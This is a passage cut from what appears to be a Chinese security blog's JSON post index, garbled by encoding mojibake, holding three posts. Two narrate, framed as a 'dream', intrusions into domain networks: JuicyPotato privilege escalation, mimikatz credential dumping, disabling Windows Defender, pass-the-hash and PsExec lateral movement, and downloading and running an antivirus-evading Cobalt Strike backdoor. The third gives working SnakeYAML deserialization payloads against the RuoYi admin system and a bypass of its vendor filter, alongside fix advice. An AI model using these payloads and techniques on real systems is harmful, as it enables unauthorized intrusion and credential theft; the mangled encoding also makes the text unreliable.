ç”¨æˆ·åˆ°Administratorsç»„ï¼Œè€Œä¸”ä¸Šé¢æœ‰å¼€äº†è¿œç¨‹æ¡Œé¢ï¼Œå¯ä»¥ç›´æ¥è¿œç¨‹æ¡Œé¢è¿ä¸Šå»ï¼ŒæŠŠWinDefendç»™é²¨äº†ã€‚ åé¢å¸¸è§„çš„åˆ›å»ºç”¨æˆ·åŠ å…¥åˆ°Administratorsç»„ï¼ŒCSå¼€å¯socksä»£ç†ï¼Œä½†è¿æ¥è¿œç¨‹æ¡Œé¢æ—¶å€™é‡åˆ°NLAè®¤è¯é—®é¢˜ï¼ŒæŸ¥è¯¢åˆ°freerdpæ”¯æŒNLAï¼Œç”¨freerdpè§£å†³ã€‚ è™½ç„¶è¿œç¨‹æ¡Œé¢è¿›äº†å»ï¼Œä½†æ˜¯WinDefendé€šå¸¸åªæœ‰å¯åŠ¨è¿™ä¸ªæœåŠ¡çš„ç”¨æˆ·æ‰èƒ½åœæ­¢ï¼Œä¸€èˆ¬æ˜¯systemç”¨æˆ·ï¼Œå¥‡æ€ªçš„æ˜¯ç”¨BadPotatoæ‰§è¡Œåœæ­¢æœåŠ¡çš„å‘½ä»¤è¿˜æ˜¯æ²¡æ³•å…³é—­ï¼Œå¥½åœ¨åœ¨superuserä¸Šæ‰¾åˆ°äº†ä¸ªå…³é—­WinDefendçš„æ–¹æ³•ã€‚ æ‰“å¼€gpedit.mscï¼Œåˆ‡æ¢åˆ°Computer Configuration &gt; Administrative Templates &gt; Windows Components &gt; Windows Defenderï¼ŒTurn off Windows Defenderè®¾ç½®ä¸ºEnableã€‚ è™½ç„¶æ˜¯æ²¡æŠ“åˆ°æ˜æ–‡å¯†ç ï¼Œä½†æ˜¯æœ‰NTLMï¼Œå¯ç”¨åˆ©ç”¨Pass The Hashæ¨ªå‘ç§»åŠ¨ã€‚ç”±äºCSçš„æ¨ªå‘ç§»åŠ¨æ˜¯ç›´æ¥ä¼ åé—¨çš„ï¼Œåé¢çŸ¥é“åŸŸå†…ä¸»æœºå…¨éƒ½æœ‰æ€è½¯ï¼Œæ‰“å®Œä¹‹åå…¨éƒ½æ²¡ä¸Šçº¿ã€‚ æ‰€ä»¥ä¸Šä¼ äº†ä¸ªInvoke-TheHashæ¥PTHï¼Œå¤§éƒ¨åˆ†ä¸»æœºéƒ½èƒ½æ‰§è¡Œå‘½ä»¤ã€‚ ç”¨powershellä¸‹è½½CSçš„å…æ€åé—¨å¹¶æ‰§è¡Œï¼ŒæˆåŠŸè®©åŸŸå†…ä¸»æœºéƒ½ä¸Šäº†çº¿ã€‚ åç»­çš„æ¨ªå‘ç§»åŠ¨åœ¨ä¸Šçº¿çš„ä¸»æœºä¸Šæ”¶é›†åˆ°ä¸€å †txtå’Œweb.configé‡Œçš„å¯†ç ï¼Œå¯¹1433ã€sshå’ŒRDPç­‰æœåŠ¡è¿›è¡Œçˆ†ç ´ï¼Œå¯æƒœå¹¶æ²¡æœ‰çˆ†ç ´å¾—åˆ°ã€‚æ‰«äº†ä¸€éå†…ç½‘webæœåŠ¡ï¼Œéƒ½æ˜¯äº›ç½‘ç»œè®¾å¤‡ï¼Œè¿˜æœ‰ä¸€ä¸ªå¼€æºçš„åå°ï¼Œå¼±å£ä»¤è¿›äº†å…¶ä¸­ä¸€ä¸ªï¼Œä½†æ˜¯æ²¡ä»€ä¹ˆæ”¶è´§ã€‚ åè®°æ€»ç»“ä¸‹è¿™æ¬¡çš„æ¸—é€æµç¨‹ï¼š getshell-&gt;åŸŸä¿¡æ¯æ”¶é›†-&gt;ææƒ-&gt;è·å–NTLM-&gt;å…³é—­WinDefend-&gt;PTHæ¨ªç§»åŠ¨","link":"/2020/09/11/ç¬¬äºŒæ¬¡æ¢¦é‡Œçš„åæ¸—é€/"},{"title":"è‹¥ä¾ååºåˆ—æ¼æ´å¤ç°åŠå…¶ä¿®å¤ç»•è¿‡","text":"å‰è¨€å­¦å®Œäº†Javaååºåˆ—åŒ–ï¼Œåœ¨CNVDä¸Šæ‰¾äº†ä¸ªæœ‰Javaååºåˆ—åŒ–æ¼æ´çš„ç³»ç»Ÿç»ƒç»ƒæ‰‹ï¼Œå«è‹¥ä¾åå°ç®¡ç†ç³»ç»Ÿï¼Œåœ¨githubä¸Šçš„staræ•°ä¹Ÿä¸å°‘ã€‚æˆ‘æ˜¯æŒºå–œæ¬¢è¿™ä¸ªåå­—çš„ï¼Œä½ è‹¥ä¸ç¦»ä¸å¼ƒã€æˆ‘å¿…ç”Ÿæ­»ç›¸ä¾ï¼Œè¿™ä¸ªå¯“æ„å¯æ˜¯ä½œè€…çš„å®˜æ–¹è§£è¯»ï¼Œä¸æ˜¯æˆ‘çç¼–çš„ã€‚ğŸ˜† ä¿¡æ¯æ”¶é›†ä¸»è¦æ˜¯çœ‹çœ‹æœ‰æ²¡æœ‰ä»£ç å®¡è®¡çš„æ–‡ç« ï¼Œæœäº†ä¸‹å‘ç°æœ‰ä¸€ç¯‡ç®€å•å®¡è®¡è¿™ä¸ªååºåˆ—åŒ–æ¼æ´çš„æ–‡ç« ï¼Œåœ¨å®˜ç½‘ä¸Šè¿˜ååˆ†è‰¯å¿ƒçš„ç»™å‡ºäº†å†å²æ¼æ´ã€‚åœ¨å†å²æ¼æ´é‡Œç»™å‡ºäº†Pocå’Œä¿®å¤æ–¹æ¡ˆã€‚ å¯ä»¥åˆæ­¥å¾—çŸ¥æ¼æ´å‡ºç°åœ¨å®šæ—¶ä»»åŠ¡çš„SysJobControlleræ§åˆ¶å™¨é‡Œï¼Œä¸‰ä¸ªPOCçš„å‰ä¸¤ä¸ªæ˜¯JNDIæ³¨å…¥ï¼Œåä¸€ä¸ªæ˜¯yamlååºåˆ—åŒ–ã€‚ æ¼æ´å¤ç°æ¼æ´å¤ç°è¿™é‡Œä½¿ç”¨yamlååºåˆ—åŒ–çš„payloadæ¥å¤ç°ã€‚åœ¨githubä¸Šä¸‹è½½yaml-payloadå¹¶ç¼–è¯‘æ‰“åŒ…æˆjaråŒ…ï¼Œå¹¶ä½¿ç”¨pythonçš„SimpleHTTPServeræ¨¡å—èµ·ä¸€ä¸ªHTTPæœåŠ¡ç”¨æ¥ä¸‹è½½æ¶æ„jaråŒ…ã€‚ç„¶åï¼Œåœ¨åå°ç³»ç»Ÿç›‘æ§çš„å®šæ—¶ä»»åŠ¡é‡ŒåŠ ä¸Šä»¥ä¸‹ä¸€æ¡ä»»åŠ¡ã€‚ 1org.yaml.snakeyaml.Yaml.load(&apos;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;http://127.0.0.1:8000/yaml-payload.jar&quot;]]]]&apos;) ç„¶åï¼ŒIDEAé‡Œåœ¨Runtimeçš„execæ–¹æ³•ä¸‹ä¸ªæ–­ç‚¹ï¼Œå¹¶åœ¨ç›¸åº”å®šæ—¶ä»»åŠ¡çš„æ›´å¤šæ“ä½œé‡Œæ‰§è¡Œä¸€æ¬¡ä»»åŠ¡ã€‚åœ¨è°ƒç”¨æ ˆé‡Œå¯çœ‹åˆ°ï¼Œé¡¹ç›®é‡Œçš„æ–¹æ³•è°ƒç”¨æœ‰å››ä¸ªï¼Œå…¶ä»–ä¸¤å—çš„è°ƒç”¨æ ˆåˆ†åˆ«æ˜¯quartzä»»åŠ¡è°ƒåº¦æ¡†æ¶å’Œsnakeyamlçš„æ ˆã€‚ è·Ÿè¿›AbstractQuartzJobçš„executeæ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•æ˜¯ç”±quartzä»»åŠ¡è°ƒåº¦æ¡†æ¶è°ƒç”¨çš„ï¼Œç”±quartzçš„æ–‡æ¡£å¯çŸ¥æ¯ä¸ªå®ç°Jobæ¥å£çš„ç±»ä¸ºä¸€ä¸ªä»»åŠ¡ï¼Œè¿™ä¸ªç±»è¿˜éœ€é‡å†™executeæ–¹æ³•æ¥å®ç°ä»»åŠ¡çš„æ‰§è¡Œå†…å®¹ã€‚åœ¨è¿™ä¸ªexecuteæ–¹æ³•é‡Œï¼Œå®ƒå®ä¾‹åŒ–äº†ä¸€ä¸ªSysJobç±»ï¼Œå¹¶è°ƒç”¨äº†doExecuteæ–¹æ³•ã€‚è°ƒç”¨çš„doExecuteæ–¹æ³•æ˜¯å­ç±»QuartzDisallowConcurrentExecutionï¼ŒåŠŸèƒ½åªæ˜¯å†ç»§ç»­è°ƒç”¨JobInvokeUtilçš„invokeMethodé™æ€æ–¹æ³•ã€‚ ç»§ç»­è·Ÿè¿›åˆ°invokeMethodæ–¹æ³•ï¼Œæ‰æœ‰ä¸€äº›å®è´¨æ€§çš„é€»è¾‘ä»£ç ã€‚å¼€å¤´è°ƒç”¨ç›®æ ‡ã€ç±»åã€æ–¹æ³•åå’Œæ–¹æ³•å‚æ•°ã€‚ 123456789101112131415161718public static void invokeMethod(SysJob sysJob) throws Exception{ String invokeTarget = sysJob.getInvokeTarget(); String beanName = getBeanName(invokeTarget); String methodName = getMethodName(invokeTarget); List&lt;Object[]&gt; methodParams = getMethodParams(invokeTarget); if (!isValidClassName(beanName)) { Object bean = SpringUtils.getBean(beanName); invokeMethod(bean, methodName, methodParams); } else { Object bean = Class.forName(beanName).newInstance(); invokeMethod(bean, methodName, methodParams); }} éœ€è¦æ³¨æ„çš„æ˜¯è·å–æ–¹æ³•å‚æ•°è¿™é‡Œï¼Œåªèƒ½è·å–Stringã€boolenã€longã€doubleå’Œintç±»å‹çš„å‚æ•°ã€‚ 1234567891011121314151617181920212223242526272829303132public static List&lt;Object[]&gt; getMethodParams(String invokeTarget){ String methodStr = StringUtils.substringBetween(invokeTarget, \"(\", \")\"); if (StringUtils.isEmpty(methodStr)) { return null; } String[] methodParams = methodStr.split(\",\"); List&lt;Object[]&gt; classs = new LinkedList&lt;&gt;(); for (int i = 0; i &lt; methodParams.length; i++) { String str = StringUtils.trimToEmpty(methodParams[i]); // Stringå­—ç¬¦ä¸²ç±»å‹ï¼ŒåŒ…å«' if (StringUtils.contains(str, \"'\")) { classs.add(new Object[] { StringUtils.replace(str, \"'\", \"\"), String.class }); } // booleanå¸ƒå°”ç±»å‹ï¼Œç­‰äºtrueæˆ–è€…false else if (StringUtils.equals(str, \"true\") || StringUtils.equalsIgnoreCase(str, \"false\")) ... // longé•¿æ•´å½¢ï¼ŒåŒ…å«L else if (StringUtils.containsIgnoreCase(str, \"L\")) ... // doubleæµ®ç‚¹ç±»å‹ï¼ŒåŒ…å«D else if (StringUtils.containsIgnoreCase(str, \"D\")) ... // å…¶ä»–ç±»å‹å½’ç±»ä¸ºæ•´å½¢ else ... } return classs;} åç»­æ­£å¸¸ç±»åä¼šè¿›å…¥elseä»£ç ä½“ï¼Œé€šè¿‡newInstanceæ–¹æ³•è·å¾—ä¼ å…¥ç±»åçš„æ— å‚æ„é€ æ–¹æ³•å®ä¾‹åŒ–çš„å¯¹è±¡ï¼Œç„¶åä½¿ç”¨å¯¹è±¡ã€æ–¹æ³•åå’Œæ–¹æ³•å‚æ•°è°ƒç”¨å¦ä¸€ä¸ªé‡è½½çš„invokeMethodæ–¹æ³•ã€‚è¿™ä¸ªé‡è½½çš„invokeMethodæ–¹æ³•å°±æ˜¯å®ç°åå°„è°ƒç”¨æ–¹æ³•çš„åŠŸèƒ½ï¼Œè¿™é‡Œå°±æ˜¯ä¸ç»†è¯´äº†ã€‚è‡³äºPOCä¸­JNDIæ³¨å…¥ï¼Œä¸Šä¸€ç¯‡æ–‡ç« æœ‰åˆ†æï¼Œè¿™é‡Œä¹Ÿä¸ç»†è¯´äº†ï¼Œè€Œyamlæ€ä¹ˆå®ç°çš„ååºåˆ—åŒ–ï¼Œæœ¬æ–‡ä¹Ÿä¸å±•å¼€ï¼Œåœ¨åç»­çš„æ–‡ç« ä¸­å†ä»”ç»†åˆ†æã€‚ é€šè¿‡ä»¥ä¸Šçš„è°ƒç”¨æ ˆçš„åˆ†æï¼Œå¯å¾—å‡ºä»¥ä¸‹æ„é€ è‹¥ä¾ååºåˆ—åŒ–æ¼æ´payloadçš„æ¡ä»¶ï¼š å…¥å£ç±»åªå¯è¿›è¡Œä¸€æ¬¡åå°„è°ƒç”¨ å…¥å£ç±»éœ€å¯è¢«å®ä¾‹åŒ–ï¼Œå¹¶å…·æœ‰é»˜è®¤çš„æ— å‚æ„é€ æ–¹æ³• è°ƒç”¨çš„ç±»æ–¹æ³•éœ€ä¸ºæ— å‚æˆ–å‚æ•°ä¸ºStringã€boolenã€longã€doubleå’Œintå‡ ç§ç±»å‹ è¿‡æ»¤ä¸ä¸¥å›åˆ°å®˜ç½‘ï¼Œä½œè€…ç»™å‡ºçš„ä¿®å¤æ–¹æ¡ˆæ˜¯è¿‡æ»¤rmiã€ldapã€httpå­—ç¬¦ä¸²ï¼Œå¯¹åº”çš„æ˜¯ä½œè€…ç»™å‡ºçš„ä¸‰ä¸ªPOCã€‚é‚£è¿˜æœ‰å…¶ä»–åè®®å¯ä»¥å®ç°ååºåˆ—åŒ–å—ï¼Ÿç­”æ¡ˆæ˜¯è‚¯å®šçš„ï¼Œ è™½ç„¶å®˜æ–¹æ–‡æ¡£å¥½åƒæ²¡æœ‰ç»™å‡ºURLç±»æ”¯æŒçš„åè®®ï¼Œä½†å¯ä»¥ä½¿ç”¨ä»¥ä¸‹éªŒè¯æ”¯æŒé‚£ç§åè®®ã€‚ 12345678910111213141516public static void main(String[] args) { String host = \"www.baidu.com\"; String file = \"/index.html\"; String[] schames = {\"http\", \"https\", \"ftp\", \"mailto\", \"telnet\", \"file\", \"ldap\", \"gopher\", \"jdbc\", \"rmi\", \"jndi\", \"jar\", \"doc\", \"netdoc\", \"nfs\", \"verbatim\", \"finger\", \"daytime\", \"systemresource\", \"webService\", \"redis\", \"zookeeper\", \"rest\", \"thrift\", \"dubbo\"}; for (int i = 0; i &lt; schames.length; i++) { try { URL url = new URL(schames[i], host, file); System.out.println(\"æ»‹ç“· \" + schames[i] + \" åè®®\"); } catch (MalformedURLException e) { System.out.println(\"ä¸æ»‹ç“· \" + schames[i] + \" åè®®\"); } }} åœ¨æµ‹è¯•ç»“æœä¸­ä¸€çœ¼å°±èƒ½çœ‹åˆ°fileåè®®å’Œftpåè®®ï¼Œè¿˜æœ‰ä¸ªjaråè®®ä¹Ÿæ˜¯å¯ä»¥ä½¿ç”¨çš„ï¼Œä½†è¿˜æ˜¯éœ€è¦å€ŸåŠ©å…¶ä»–åè®®æ‰èƒ½ä¸‹è½½jaråŒ…ï¼Œå°±æ²¡å¿…è¦å¤šæ­¤ä¸€ä¸¾äº†ã€‚ ftpåè®®çš„æ¼æ´åˆ©ç”¨å’Œhttpåè®®çš„å…¶å®å·®ä¸å¤šï¼ŒæŠŠPOCä¸­çš„åè®®æ”¹ä¸€æ”¹ï¼ŒftpæœåŠ¡å¯ä»¥ä½¿ç”¨pythonçš„pyftpdlibæ¨¡å—æ­ä¸€ä¸ªã€‚ fileåè®®çš„åˆ©ç”¨éœ€è¦æŠŠjaråŒ…ä¸Šä¼ åˆ°ç½‘ç«™ä¸Šï¼Œé€šçŸ¥å…¬å‘Šæ¨¡å—çš„ç¼–è¾‘å™¨å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œè™½ç„¶æœ‰æ–‡ä»¶åç¼€çš„ç™½åå•è¿‡æ»¤ï¼Œä½†å¹¶ä¸å½±å“URLç±»åŠ è½½jaråŒ…ã€‚ä¸è¿‡ä¸Šä¼ æ–‡ä»¶è¿”å›çš„è·¯å¾„å¹¶ä¸æ˜¯ç½‘ç«™ä¸Šç‰©ç†è·¯å¾„ï¼Œåœ¨springçš„é…ç½®æ–‡ä»¶application.ymlä¸­å¯ä»¥çœ‹åˆ°windowsçš„é»˜è®¤è·¯å¾„ä¸ºD:/ruoyi/uploadPathï¼Œlinuxçš„é»˜è®¤è·¯å¾„ä¸º/home/ruoyi/uploadPathã€‚ æ‰€ä»¥ç‰©ç†è·¯å¾„æ˜¯D:/ruoyi/uploadPath/upload/2021/09/03/124841a8-6ae4-4888-ba7b-d7ac786cdd6f.txtï¼Œæœ€åçš„payloadå¦‚ä¸‹ã€‚ 1org.yaml.snakeyaml.Yaml.load(&apos;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;file:/D:/ruoyi/uploadPath/upload/2021/09/03/124841a8-6ae4-4888-ba7b-d7ac786cdd6f.txt&quot;]]]]&apos;) ä¸€äº›å…¶ä»–å°è¯•é™¤äº†è¿‡æ»¤ä¸ä¸¥ï¼Œè¿˜æƒ³åˆ°äº†ä¸¤ç§æ„é€ payloadçš„æ–¹æ³•ï¼Œåˆ†åˆ«ä¸ºä»ä¾èµ–åŒ…å’Œé¡¹ç›®ä¸­å¯»æ‰¾åˆé€‚çš„ç±»å’Œæ–¹æ³•ã€‚ç”±äºç³»ç»Ÿæ¡†æ¶æ˜¯Springçš„ï¼Œä¸€å¼€å§‹æƒ³åˆ°çš„æ˜¯ç”¨SpELè¡¨è¾¾å¼æ¥å®ç°å‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯åé¢è¯•äº†ä¸‹æ‰çŸ¥é“parseExpressionæ–¹æ³•ç”Ÿæˆè¡¨è¾¾å¼å¯¹è±¡åï¼Œè¿™ä¸ªå¯¹è±¡è¿˜å¾—è°ƒç”¨getValueæ–¹æ³•æ‰ä¼šè§£æè¿™ä¸ªè¡¨è¾¾å¼ã€‚åé¢é™†é™†ç»­ç»­çœ‹äº†äº›è´¨æ–™ï¼Œå‘ç°ELè¡¨è¾¾å¼ä¼¼ä¹ç¬¦åˆè¿™ä¸ªç³»ç»Ÿçš„åœºæ™¯ã€‚ç®€å•çš„ä»‹ç»ä¸‹ELè¡¨è¾¾å¼ï¼Œä»–æ˜¯ä¸€ç§å¯åœ¨JSPå’ŒJSPXä¸­ä½¿ç”¨çš„è¯­è¨€ï¼Œå¯åœ¨è„šæœ¬ä¸­è·å–å‚æ•°ã€æ‰§è¡Œè¿ç®—ã€è·å–å¯¹è±¡å’Œè°ƒç”¨å‡½æ•°ç­‰ã€‚ åœ¨Javaä»£ç ä¸­å¯ä»¥ä½¿ç”¨ELProcessorå¯¹è±¡çš„evalè§£æELè¡¨è¾¾å¼ï¼Œç»è¿‡ç®€å•æ„é€ å¯å¾—å‡ºpayloadå¦‚ä¸‹ï¼š 1javax.el.ELProcessor.eval(&apos;&quot;&quot;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;new java.lang.ProcessBuilder[\\&apos;(java.lang.String[])\\&apos;]([\\&apos;cmd\\&apos;,\\&apos;/c\\&apos;,\\&apos;calc\\&apos;]).start()&quot;)&apos;) ç„¶è€Œä¸€è·‘èµ·æ¥å°±æŠ›å‡ºäº†ELExceptionå¼‚å¸¸ï¼Œè°ƒè¯•è·Ÿåˆ°åå°„è°ƒç”¨çš„åœ°æ–¹å‘ç°ELè¡¨è¾¾å¼åªå‰©ä¸‹&quot;&quot;.getClass(ã€‚ æœ€åå›å»æ‰¾ï¼Œå¤§æ„äº†ã€‚åœ¨StringUtilså·¥å…·ç±»çš„substringBetweenæ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯ä»–è·å–å‚æ•°çš„æ–¹æ³•ä¸­å‘ç°å®ƒåŒ¹é…çš„å³æ‹¬å·æ˜¯ä¼ å…¥payloadä¸­çš„ç¬¬ä¸€ä¸ªï¼Œä¹Ÿå°±æ˜¯payloadä¸­è°ƒç”¨çš„æ–¹æ³•ä¸èƒ½å‡ºç°å·¦æ‹¬å·ï¼Œå¦åˆ™æ— æ³•è·å–åˆ°æ‰€æœ‰çš„å‚æ•°ã€‚ é™¤äº†ä¾èµ–åŒ…ä¸­çš„ç±»ï¼Œè¿˜æ‰¾äº†ä¸€åœˆé¡¹ç›®ä¸­çš„ç±»ï¼Œå‘ç°ä¸€ä¸ªyamlçš„å·¥å…·ç±»YamlUtilçš„loadYamlæ–¹æ³•å¯èƒ½åˆé€‚ï¼Œäºæ˜¯åˆç®€å•çš„æ„é€ äº†ä¸ªpayloadï¼š 1com.ruoyi.common.utils.YamlUtil.loadYaml(&apos;D:/ruoyi/uploadPath/upload/2021/09/03/124841a8-6ae4-4888-ba7b-d7ac786cdd6f.txt&apos;) è¿™æ¬¡åˆ™æ˜¯æŠ›å‡ºäº†FileNotFoundExceptionï¼Œå› ä¸ºgetResourceAsStreamæ–¹æ³•æ— æ³•è·å–ClassPathå¤–çš„æ–‡ä»¶ï¼Œå®åœ¨æ˜¯å­¦è‰ºä¸ç²¾ã€‚ åç»­åœ¨é¡¹ç›®ä¸­è¿˜å‘ç°äº†å¦ä¸€ä¸ªå¯åˆ©ç”¨çš„ç‚¹ï¼ŒFileUtilså·¥å…·ç±»çš„deleteFileæ–¹æ³•å¯ä»¥å®ç°ä»»æ„æ–‡ä»¶åˆ é™¤ï¼Œä½†æœ¬æ–‡çš„ç›®æ ‡æ˜¯getshellï¼Œè€Œä¸”åˆ©ç”¨æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œè¿™é‡Œå°±ä¸å†å…·è¿°ã€‚ ä¿®å¤å»ºè®®å€Ÿç€æ¼æ´æ¡ä¾‹çš„é¢å¸ƒï¼Œè¿™é‡ŒçŒ®ä¸Šæœ¬äººçš„ä¿®å¤å»ºè®®ã€‚å…¶å®åœ¨æˆ‘ä¸Šä¸€ä¸ªå®¡è®¡çš„ç³»ç»Ÿä¸­ä¹Ÿæ˜¯æœ‰å®šæ—¶ä»»åŠ¡åŠŸèƒ½çš„ï¼Œä¹Ÿæ˜¯é€šè¿‡åå°„çš„æ–¹å¼è°ƒç”¨ä»»åŠ¡çš„å®ç°ä»£ç ï¼Œä½†æ˜¯ç”¨æˆ·åªèƒ½ä¼ å…¥å®ç°è¿™ä¸ªæ–¹æ³•çš„ç±»åï¼Œç³»ç»Ÿå®ä¾‹åŒ–è¿™ä¸ªç±»å¹¶è°ƒç”¨ç‰¹å®šçš„æ–¹æ³•ã€‚ åœ¨è¿™ä¸ªç³»ç»Ÿä¸­å½“ç„¶å¯ä»¥ä½¿ç”¨é»‘ç™½åå•çš„æ–¹å¼å¯¹å¯å®ä¾‹åŒ–çš„ç±»è¿›è¡Œè¿‡æ»¤ï¼Œä½†è¿™æ ·ä¼¼ä¹ä¿®å¤å¾—ä¸å½»åº•ã€‚å¦‚æœä½¿ç”¨è°ƒç”¨ç‰¹å®šæ–¹æ³•çš„æ–¹å¼æ‰§è¡Œä»»åŠ¡ï¼Œåªéœ€è®¾ç½®ä¸€ä¸ªæ¯”è¾ƒç‰¹æ®Šçš„æ–¹æ³•åï¼Œè¿™ä¸ªæ¼æ´å°±å¾ˆéš¾åˆ©ç”¨èµ·æ¥äº†ï¼Œå®é™…ä¸Šè¿™ä¸ªç³»ç»Ÿç”¨åˆ°çš„quartzä»»åŠ¡è°ƒåº¦æ¡†æ¶å°±æ˜¯ä½¿ç”¨ç±»ä¼¼çš„æ–¹å¼ï¼Œä½œä¸ºè°ƒåº¦ä»»åŠ¡çš„ç±»ç»­å®ç°quartzçš„Jobæ¥å£ï¼Œå¹¶é‡å†™executeæ–¹æ³•ã€‚ å½“ç„¶ï¼Œä»¥ä¸Šåªæ˜¯ä¸ªäººå¯¹è¿™ä¸ªæ¼æ´ä¿®å¤çš„å°å°çœ‹æ³•ï¼Œä»…ä¾›å‚è€ƒã€‚ åè®°æœ¬æ¥æƒ³æ‰¾åˆ°æ›´é«˜å¤§ä¸Šçš„payloadï¼Œæœ€åè¿˜åªæ˜¯æ‰¾åˆ°è¿‡æ»¤ä¸ä¸¥çš„é—®é¢˜ï¼Œæ€»çš„æ¥è¯´è¿˜æ˜¯å­¦è‰ºä¸ç²¾ã€‚ä¸è¿‡äº†è§£åˆ°å„ç§è¡¨è¾¾å¼è¿˜æ˜¯é¢‡æœ‰æ”¶è·ï¼Œæœ€åå„ä½å¸ˆå‚…è‹¥æƒ³åˆ°å…¶ä»–payloadï¼Œæœ›ä¸åèµæ•™ã€‚ å‚è€ƒhttps://www.cnblogs.com/r00tuser/p/14693462.html https://doc.ruoyi.vip/ruoyi/document/kslj.html#%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E https://blog.csdn.net/weixin_41725792/article/details/109818161 https://zhuanlan.zhihu.com/p/183902092","link":"/2021/09/04/è‹¥ä¾ååºåˆ—æ¼æ´å¤ç°åŠå…¶ä¿®å¤ç»•è¿‡/"},{"title":"è®°ä¸€æ¬¡æ¢¦é‡Œçš„åæ¸—é€","text":"å‰è¨€å‰å‡ å¤©æ™šä¸Šåšäº†ä¸€ä¸ªæ¢¦ï¼Œæ¢¦é‡Œåšäº†ä¸€æ¬¡åæ¸—é€ï¼Œæ¢¦åˆ°æˆ‘æ‹¿ä¸‹åŸŸæ§ï¼Œä»Šå¤©è§‰å¾—åº”è¯¥è®°å½•ä¸‹æ¥ã€‚ æœ¬æ–‡çº¯å±è™šæ„ï¼Œå¦‚æœ‰é›·åŒçº¯å±å·§åˆã€‚ ä¿¡æ¯æ”¶é›†èµ·æ‰‹ä¸€ä¸ªwebshellï¼Œè¿æ°”æ¯”è¾ƒå¥½ï¼Œtasklistæ²¡æœ‰æ€è½¯ï¼Œä¸Šä¼ ä¸€ä¸ªcsåé—¨æ–¹ä¾¿æ‰§è¡Œå‘½ä»¤ã€‚ å…ˆçœ‹çœ‹ç”¨æˆ·å’Œè¡¥ä¸æƒ…å†µï¼Œå‘ç°å‘ç°æ˜¯ä¸ªä½æƒé™ç”¨æˆ·nt authority\\network serviceï¼ŒWindows2008R2è¡¥ä¸ä¹Ÿæ‰“å¾—æŒºå‹¤å¿«çš„ã€‚ 12whoamiwmic qfe get Caption,Description,HotFixID,InstalledOn ipconfigçœ‹åˆ°å­˜åœ¨ä¸¤å¼ å†…ç½‘ç½‘å¡ã€‚ æŸ¥æ‰¾åŸŸæ§ï¼Œå®šä½åˆ°ä¸¤å°ã€‚ 12net group \"domain controllers\" /domainping XXX é…ç½®æ–‡ä»¶ã€txtä¹‹ç±»çš„æ–‡ä»¶éƒ½æ”¶é›†äº†ä¸€éï¼Œæ²¡æ‰¾åˆ°æ•æ„Ÿä¿¡æ¯ã€‚ ææƒè™½ç„¶è¡¥ä¸æ‰“å¾—æŒºå‹¤å¿«çš„ï¼Œä½†æ˜¯ç”¨twitterå¤§ä½¬çš„ææƒæ£€æµ‹è„šæœ¬ï¼Œç”¨è‡ªå¸¦å‘½ä»¤å°±æ˜¯whoami /privï¼Œå‘ç°ä¸€å¤„ç‰¹æƒæ»¥ç”¨ï¼šSeImpersonatePrivilegeã€‚æ ¹æ®ä¸‰å¥½å­¦ç”Ÿå¸ˆå‚…çš„æ–‡ç« å¾—çŸ¥å¯ç”¨JuicePotatoææƒã€‚ ç”¨å¤šæ±åœŸè±†è¿è¡Œæˆ‘ä»¬çš„åé—¨ï¼Œè¿‡ä¼šå°±èƒ½åœ¨scé‡Œçœ‹è§ä¸Šçº¿äº†ä¸€å°systemæƒé™çš„æœºå™¨ã€‚ 1JuicyPotato -l 1337 -p \\path\\to\\cs.exe -t * åˆæ˜¯è¿æ°”çˆ†æ£šçš„æ—¶å€™ï¼ŒæŸ¥åˆ°æœ¬æœºä¿å­˜äº†åŸŸæ§å¯†ç ï¼Œè€Œä¸”æ˜¯win2008ï¼Œç”¨mimikatzè¯»ä¸€æ³¢æ˜æ–‡å¯†ç ã€‚ æ¨ªå‘ç§»åŠ¨æ—¢ç„¶æœ‰äº†åŸŸåç®¡ç†å‘˜å¯†ç ï¼Œå°±å¯ä»¥ç”¨msfçš„smb_loginå’Œpsexecè¿›è¡Œæ¨ªå‘ç§»åŠ¨ï¼Œä½†æˆ‘è¿™é‡Œç”¨csçš„psexecï¼Œèƒ½ç›´æ¥ä¸Šçº¿ä¸»æœºã€‚ å³é”®sessionç‚¹å‡»net viewè·å–targetï¼Œåœ¨target viewé€‰ä¸­æ‰€æœ‰targetï¼Œå³é”®login->psexecï¼Œé€‰ä¸­è¯»åˆ°çš„æ˜æ–‡å¯†ç ã€é€‰ä¸­ä¸€ä¸ªlistenerã€é€‰ä¸­ä¸€ä¸ªsessionï¼Œå¼€æ‰«ï¼ è¿‡äº†åŠä¸ªå°æ—¶ï¼Œå­˜æ´»çš„æœºå­å‡ ä¹éƒ½ä¸Šäº†çº¿ã€‚ å†è½¬åˆ°msfï¼Œç”¨MS17-010æ‰«æ‰«ã€‚å‘ç°éƒ½å†…ç½‘è¡¥ä¸éƒ½æ•´æŒºå¥½çš„ï¼Œä¸€ä¸ªéƒ½æ²¡æ‰«åˆ°ã€‚å†…ç½‘è¿˜æœ‰å‡ å°linuxçš„æœºå­ï¼Œä½†æ˜¯ä¸æƒ³ç»§ç»­æäº†ï¼Œæ“¦æ“¦å±è‚¡ï¼ŒæŠ¥å‘Šç»™å‚å•†ã€‚ï¼ˆè·‘ åè®°å¦‚æ¢¦åˆé†’ï¼ŒåŸæ¥æˆ‘å¹¶æ²¡æœ‰æä»€ä¹ˆåæ¸—é€ï¼Œä¹Ÿæ²¡æ‹¿ä»€ä¹ˆåŸŸæ§ï¼Œæˆ‘è¿˜æ˜¯è¿™æ ·çš„èœï¼Œè¿˜æ˜¯æ— ä¸šæ¸¸æ°‘ä¸€ä¸ªï¼Œä¸€åˆ‡éƒ½æ˜¯æ¢¦ã€‚ è¿‡å‡ å¤©åˆæœ‰ctfæ‰“äº†ï¼Œå¾—é‡æ–°æ‹¿èµ·pwnï¼Œåšä¸ªpwnå¼Ÿå¼Ÿäº†ã€‚","link":"/2020/08/10/è®°ä¸€æ¬¡æ¢¦é‡Œçš„åæ¸—é€/"},{"title":"[é€†å‘å­¦ä¹ 